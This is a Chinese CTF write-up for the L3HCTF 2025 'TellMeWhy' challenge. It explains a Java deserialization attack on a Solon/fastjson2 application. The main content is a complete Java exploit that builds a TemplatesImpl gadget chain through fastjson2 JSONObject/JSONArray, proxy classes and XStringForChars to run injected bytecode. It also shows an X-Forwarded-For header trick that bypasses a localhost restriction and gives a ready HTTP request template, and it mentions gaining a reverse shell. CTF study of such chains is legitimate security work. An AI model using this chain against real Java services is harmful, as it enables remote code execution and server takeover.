---
title: L3HCTF 2025 TellMeWhy —— Fastjson 高版本 Getter 利用
date: 2025-07-15
last_modified_at: 2025-07-15 9:30:00 +0800
categories: CTF
tags: [fastjson]
pin: false
math: true
mermaid: true
image:
  path: /assets/images/L3HCTF-2025.png
toc: true

---

## 赛题分析
1. 存在 solon 3.3.1、fastjson2:2.0.57 、freemarker、HikariCP:4.0.3 依赖。
2. HomeController 存在反序列化操作，MyInputObjectStream 进行过滤，禁掉了一些 toString 入口。
3. 进入序列化之前还有一堆奇怪的过滤。
   1. MyFilter /baby/** 下的路由只允许 127.0.0.1 访问，添加一个 Header 可以绕过： X-Forwarded-For: 127.1
   2. map.size() != jsonObject.length() 尝试添加一个带 @ 的 json 键，solon 不会自动解析。这样就可以进到反序列化了。
    ```json
    {"extraField":"111",
    "@type":"org.codehaus.groovy.control.ProcessingUnit",
    "why":"base64 code"}
    ```

## 反序列化思路

fastjson2 高版本无法触发 getter ，绕过手法可以参考这篇文章：[高版本Fastjson在Java原生反序列化中的利用](https://mp.weixin.qq.com/s/gl8lCAZq-8lMsMZ3_uWL2Q) ，但题目没有 spring 依赖，无法使用 ObjectFactoryDelegatingInvocationHandler。但出题人提供了 MyObject 和 MyProxy 来代替 ObjectFactoryDelegatingInvocationHandler

寻找可用的 toString Gadget，java-chains 中的 XString 利用链还依赖 spring 中的 HotSwappableTargetSource ，本人尝试在已有依赖中找到一个可以替代的类，但是没有找到。

Java-chains 中还提供了几个从 equals 到 toString 的 Gadget，比如 XStringForChars。配合 hashMap 可以完成从 readObject 到 equals 的调用：[ROME改造计划](https://y4tacker.github.io/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/)

本地测试时参考 [Solon内存马研究-先知社区](https://xz.aliyun.com/news/14710) 打入内存马，本地测试没问题，但是远程不行。最后测试 http 可以出网，于是采取反弹 shell，payload 可以用 java-chains 生成。

## exp
```java
package com.ironwolf.env.ctf.l3hctf_2025_TellMeWhy;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xpath.internal.objects.XStringForChars;
import common.Reflections;
import javassist.ClassPool;
import javassist.CtClass;
import org.example.demo.Utils.MyObject;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class PublicPOC {
    public static void main(String[] args) throws Exception {
        String payload = "<base>";
        byte[] clzBytes = base64Decode(payload);
        run(clzBytes);
    }

    public static void run(byte[] clzBytes) throws Exception{
        ClassPool cp = ClassPool.getDefault();
        CtClass cc = cp.makeClass(new ByteArrayInputStream(clzBytes));
        cc.setSuperclass(cp.get(Class.forName("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet").getName()));
        byte[][] bytecodes = new byte[][]{cc.toBytecode()};

        TemplatesImpl templatesimpl = new TemplatesImpl();

        Field fieldName = templatesimpl.getClass().getDeclaredField("_name");
        fieldName.setAccessible(true);
        fieldName.set(templatesimpl, "test");

        Field fieldTfactory = templatesimpl.getClass().getDeclaredField("_tfactory");
        fieldTfactory.setAccessible(true);
        fieldTfactory.set(templatesimpl, Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl").newInstance());

        Map map = new HashMap();
        map.put("object",templatesimpl);

        Object node2 = JSONObjectNodeMakeGadget(2,map);
        Proxy proxy1 = (Proxy) Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(),
                new Class[]{MyObject.class}, (InvocationHandler)node2);
        Object node3 = MyProxyMakeGadget(proxy1);
        Proxy proxy2 = (Proxy) Proxy.newProxyInstance(Proxy.class.getClassLoader(),
                new Class[]{Templates.class}, (InvocationHandler)node3);
        Object node4 = JsonArrayNodeMakeGadget(2,proxy2);
        Object nodeCompareTo = withXStringForChars("111");

        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("aa",node4);
        map1.put("bB",nodeCompareTo);
        map2.put("aa",nodeCompareTo);
        map2.put("bB",node4);

        HashMap finalMap = new HashMap();
        finalMap.put(map1,"");
        finalMap.put(map2,"");

        setFieldValue(templatesimpl,"_bytecodes",bytecodes);

        byte[] serialize = serialize(finalMap);
        System.out.println(serialize.length);
        System.out.println(base64Encode(serialize));

//        deserialize(serialize);
    }

    public static byte[] serialize(Object o) throws Exception{
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(o);
        oos.close();
        bos.close();
        return bos.toByteArray();
    }
    public static String base64Encode(byte[] bytes){
        return Base64.getEncoder().encodeToString(bytes);
    }

    public static Object deserialize(byte[] bytes) throws Exception{
        ByteArrayInputStream bis = new ByteArrayInputStream(bytes);
        ObjectInputStream ois = new ObjectInputStream(bis);
        bis.close();
        ois.close();
        return ois.readObject();
    }

    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }

    public static Object JSONObjectNodeMakeGadget(int version,Map map) throws Exception {
        String className;
        if(version==1){
            className = "com.alibaba.fastjson.JSONObject";
        }else{
            className = "com.alibaba.fastjson2.JSONObject";
        }
        Object fjsonObject = Reflections.newInstance(className, Map.class,map);
        return fjsonObject;
    }

    public static Object MyProxyMakeGadget(Object gadget) throws Exception {

        return Reflections.newInstance("org.example.demo.Utils.MyProxy",
                MyObject.class,gadget);
    }

    public static Object JsonArrayNodeMakeGadget(int version,Object gadget) throws Exception {
        if(version!=1){
            com.alibaba.fastjson2.JSONArray jsonArray = new com.alibaba.fastjson2.JSONArray();
            jsonArray.add(gadget);
            return jsonArray;
        }else {
            com.alibaba.fastjson.JSONArray jsonArray = new com.alibaba.fastjson.JSONArray();
            jsonArray.add(gadget);
            return jsonArray;
        }
    }

    public static Object withXStringForChars(String s) throws Exception{
        XStringForChars xStringForChars = new XStringForChars(new char[0], 0, 0);
        setFieldValue(xStringForChars, "m_strCache", s);
        return xStringForChars;
    }

    public static byte[] base64Decode(String str){
        return Base64.getDecoder().decode(str);
    }
}
```
发包格式如下：
```http
POST /baby/why HTTP/1.1
Host: 43.138.2.216:33906
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
X-Forwarded-For: 127.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: SOLONID=9806d2229b5645088eef66a795741e0b
Connection: keep-alive
Content-Type: application/json
Content-Length: 4254

{"extraField":"111",
"@type":"org.codehaus.groovy.control.ProcessingUnit",
"why":"<payload>"}
```